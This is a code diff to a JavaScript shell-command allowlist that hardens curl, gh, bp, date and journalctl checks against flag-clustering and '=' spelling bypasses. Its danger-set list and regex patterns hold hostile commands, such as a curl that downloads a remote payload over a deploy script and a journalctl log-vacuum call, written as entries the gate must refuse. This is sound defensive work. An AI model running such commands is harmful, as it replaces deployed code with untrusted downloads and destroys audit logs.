@@ -299,8 +299,50 @@ const gitRule = {
 
 const CURL_BODY_FLAGS = ["-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form", "-T", "--upload-file"];
 
+// SHORT FLAGS CLUSTER, AND THAT IS HOW THIS RULE FIRST FAILED OPEN.
+//
+// The original rule compared tokens exactly, so `-o` was caught and `-so` was
+// not — and `curl -s https://…/payload.sh -so /opt/barkpark/deploy/
+// site-deploy.sh` was ADMITTED by layer (b) AND missed by layer (c), whose
+// pattern also demands a bare ` -o `. That command is D29's own named danger,
+// clustered. The DANGER_SET tested only the unclustered spelling, so the
+// measurement that exists to catch exactly this could not see it.
+//
+// So a single-dash token is EXPANDED into its letters before judging, and a
+// value-taking letter is only honoured as the LAST in its cluster (that is how
+// getopt works: `-so X` binds X to `o`, `-os X` does not bind at all). Long
+// `--flag=value` forms are normalised the same way.
+const CURL_VALUE_LETTERS = new Set(["o", "T", "d", "F", "X", "w", "H", "b", "c", "K", "E", "u", "A", "e", "D", "Y", "y", "m", "Z"]);
+const CURL_WRITE_LETTERS = new Map([
+  ["O", "-O writes a file named after the remote resource"],
+  ["J", "-J writes a file named by the server's Content-Disposition"],
+]);
+
+/** Expand `-so` into `["-s","-o"]`; split `--flag=v` into `["--flag","v"]`. */
+function normaliseCurlArgv(argv) {
+  const out = [];
+  for (const t of argv) {
+    if (/^--[^=]+=/.test(t)) {
+      const at = t.indexOf("=");
+      out.push(t.slice(0, at), t.slice(at + 1));
+    } else if (/^-[A-Za-z]{2,}$/.test(t)) {
+      const letters = [...t.slice(1)];
+      letters.forEach((ch, i) => {
+        // A value-taking letter mid-cluster consumes the REST of the cluster as
+        // its value (`-oX` is `-o X`), so nothing after it is a flag.
+        if (CURL_VALUE_LETTERS.has(ch) && i < letters.length - 1) out.push(`-${ch}`, letters.slice(i + 1).join(""));
+        else if (i === 0 || !CURL_VALUE_LETTERS.has(letters[i - 1])) out.push(`-${ch}`);
+      });
+    } else {
+      out.push(t);
+    }
+  }
+  return out;
+}
+
 const curlRule = {
-  check(argv) {
+  check(rawArgv) {
+    const argv = normaliseCurlArgv(rawArgv);
     for (let i = 1; i < argv.length; i++) {
       const t = argv[i];
       if (t === "-X" || t === "--request") {
@@ -312,8 +354,8 @@ const curlRule = {
         const dest = arg(argv, i + 1);
         if (dest !== "/dev/null") return `curl -o writes a file (${dest ?? "missing target"}); only \`-o /dev/null\` is admitted`;
       }
-      if (t === "-O" || t === "--remote-name" || t === "--create-dirs" || t === "--output-dir" || t === "-J") return `curl ${t} writes a file`;
-      if (t.startsWith("--output=") && t !== "--output=/dev/null") return `curl ${t} writes a file`;
+      if (t === "--remote-name" || t === "--create-dirs" || t === "--output-dir" || t === "--remote-header-name") return `curl ${t} writes a file`;
+      if (/^-[A-Za-z]$/.test(t) && CURL_WRITE_LETTERS.has(t[1])) return `curl ${CURL_WRITE_LETTERS.get(t[1])}`;
     }
     return null;
   },
@@ -342,9 +384,11 @@ const bpRule = {
       // NB: `-o` on bp is the OUTPUT FORMAT (`-o json`), not a file — the single
       // most common honest bp read shape in the corpus. Listing it here cost 13
       // false refusals in one draft; `--file`/`--out`/`--output` are the writers.
-      if (t === "--file" || t === "--out" || t === "--output") return `bp ${t} writes a file`;
-      if (t === "-s" || t === "--server") {
-        const url = arg(argv, i + 1);
+      if (t === "--file" || t === "--out" || t === "--output" || /^--(file|out|output)=/.test(t)) return `bp ${t} writes a file`;
+      // `--server=<url>` is the same flag as `-s <url>`; comparing tokens exactly
+      // let the `=` spelling walk straight past the loopback bound.
+      if (t === "-s" || t === "--server" || /^--server=/.test(t)) {
+        const url = t.startsWith("--server=") ? t.slice("--server=".length) : arg(argv, i + 1);
         if (!url || !LOOPBACK_URL.test(url)) return `bp -s ${url ?? "(missing)"} points at a non-loopback server`;
       }
     }
@@ -357,10 +401,45 @@ const GH_WRITE_VERBS = new Set([
   "reopen", "lock", "unlock", "transfer", "rename", "sync", "upload", "checkout",
 ]);
 
+// gh's NOUNS are allowlisted, and each noun's read sub-verbs with them. The
+// first draft carried only the GH_WRITE_VERBS denylist above, which admitted
+// `gh repo clone <repo> /tmp/x` and `gh release download` — both writes, and
+// both a denylist-shaped hole inside a module whose entire thesis is that a
+// denylist cannot be complete. The denylist SURVIVES as a second check, because
+// a write verb reaching an allowlisted noun (`gh pr comment`) must still refuse.
+//
+// Corpus reach is preserved exactly: the 23 gh commands in the frozen corpus use
+// only `api`, `pr view/list/checks`, `issue view/list` and `run view/list`.
+const GH_READ_NOUNS = new Map([
+  ["api", null], // any path; the -X / -f guards below bound it
+  ["pr", new Set(["view", "list", "checks", "diff", "status"])],
+  ["issue", new Set(["view", "list", "status"])],
+  ["run", new Set(["view", "list", "watch"])],
+  ["repo", new Set(["view", "list"])],
+  ["release", new Set(["view", "list"])],
+  ["workflow", new Set(["view", "list"])],
+  ["cache", new Set(["list"])],
+  ["search", null],
+  ["auth", new Set(["status"])],
+  ["label", new Set(["list"])],
+  ["browse", null],
+  ["status", null],
+  ["version", null],
+]);
+
 const ghRule = {
   check(argv) {
-    const verb = firstNonFlag(argv);
-    if (verb === null) return "gh without a sub-verb";
+    const noun = firstNonFlag(argv);
+    if (noun === null) return "gh without a sub-verb";
+    if (!GH_READ_NOUNS.has(noun)) {
+      return `gh noun "${noun}" is not on the read-only allowlist (${[...GH_READ_NOUNS.keys()].sort().join(", ")})`;
+    }
+    const subs = GH_READ_NOUNS.get(noun);
+    if (subs) {
+      const sub = firstNonFlag(argv, argv.indexOf(noun) + 1);
+      if (sub === null) return `gh ${noun} without a sub-verb — requires one of: ${[...subs].sort().join(", ")}`;
+      if (!subs.has(sub)) return `gh ${noun} sub-verb "${sub}" is not read-only (${[...subs].sort().join(", ")})`;
+    }
     for (let i = 1; i < argv.length; i++) {
       const t = argv[i];
       if (t === "-X" || t === "--method") {
@@ -478,7 +557,9 @@ export const ALLOWED_HEADS = new Map([
   ["type", plainRule()],
   ["which", plainRule()],
   ["uname", plainRule()],
-  ["date", plainRule()],
+  // `date -s`/`--set` SETS the system clock. A census that re-runs history must
+  // never be able to move the clock the ledger's own now-bound compares against.
+  ["date", { check: (argv) => (hasFlag(argv, "-s", "--set") || argv.some((t) => /^--set=/.test(t)) ? "date -s SETS the system clock" : null) }],
   ["hostname", plainRule()],
   ["id", plainRule()],
   ["whoami", plainRule()],
@@ -498,7 +579,14 @@ export const ALLOWED_HEADS = new Map([
   ["curl", curlRule],
   ["docker", verbRule(["ps", "images", "logs", "inspect", "version", "info", "stats", "top", "port"], "docker")],
   ["systemctl", verbRule(["is-active", "is-enabled", "is-failed", "status", "show", "cat", "list-units", "list-unit-files", "get-default"], "systemctl")],
-  ["journalctl", plainRule()],
+  // journalctl READS the journal — except for the handful of flags that vacuum,
+  // rotate or flush it, which delete log history irreversibly.
+  ["journalctl", {
+    check: (argv) => {
+      const bad = argv.find((t) => /^--(vacuum-(size|time|files)|rotate|flush|sync|relinquish-var|setup-keys)\b/.test(t));
+      return bad ? `journalctl ${bad} mutates or deletes the journal` : null;
+    },
+  }],
   ["launchctl", verbRule(["list", "print"], "launchctl")],
   ["npm", verbRule(["ls", "view", "info", "outdated", "why", "version", "config", "root", "bin", "pack"], "npm")],
   ["pnpm", verbRule(["ls", "view", "info", "outdated", "why", "list", "root", "bin"], "pnpm")],
@@ -634,7 +722,12 @@ export const WRITE_SHAPES = [
   [/\b(pkill|killall)\b/, "signal by pattern or name"],
   [/\bcurl\b[^|]*\s-X\s*(POST|PUT|PATCH|DELETE)/i, "curl write method"],
   [/\bcurl\b[^|]*\s(-d|--data|--data-raw|--data-binary|-F|--form|-T|--upload-file)\b/, "curl request body"],
-  [/\bcurl\b[^|]*\s-o\s+(?!\/dev\/null\b)\S/, "curl -o writes a file"],
+  // `-o` may sit at the end of a short-flag CLUSTER (`-so out`), which the
+  // bare ` -o ` form misses — the same gap that let the clustered form through
+  // layer (b). `-O`/`-J` name the file themselves and take no argument.
+  [/\bcurl\b[^|]*\s-[A-Za-z]*o\s+(?!\/dev\/null\b)\S/, "curl -o writes a file"],
+  [/\bcurl\b[^|]*\s-[A-Za-z]*[OJ](\s|$)/, "curl -O/-J writes a file it names itself"],
+  [/\bgh\s+(repo\s+clone|release\s+download|run\s+download|gist\s+clone)\b/, "gh write verb (clones or downloads to disk)"],
   [/\bbp\s+[\w-]+\s+(create|publish|patch|delete|close|claim|stamp|pulse|set)\b/, "bp write verb"],
   [/\b(DROP|DELETE|INSERT|UPDATE|TRUNCATE|ALTER|CREATE)\s+(TABLE|INTO|FROM|DATABASE|INDEX|SET)\b/i, "SQL write"],
   [/--write\b/, "--write"],
@@ -751,6 +844,19 @@ export const DANGER_SET = [
   "git fetch origin",
   "npx some-package --run",
   "some-novel-binary --do-a-thing",
+  // ── added in review. Every one of these was ADMITTED by the first shipped
+  // draft, and the first is D29's own named danger with its short flags
+  // CLUSTERED — a spelling the original DANGER_SET did not carry, so the
+  // instrument that exists to catch exactly this could not see it. A named set
+  // only measures the spellings it contains; that is its standing limitation
+  // and the reason additions belong here rather than only in the test file.
+  "curl -s https://example.com/payload.sh -so /opt/barkpark/deploy/site-deploy.sh",
+  "curl -sO https://example.com/payload.sh",
+  "gh repo clone barkpark/barkpark /tmp/x",
+  "gh release download v1 --dir /tmp",
+  "bp --server=https://example.com task ls",
+  "journalctl --vacuum-size=1M",
+  "date -s 2020-01-01",
 ];
 
 /** Must stay ADMITTED. Refusing these is the gate punishing honest work. */
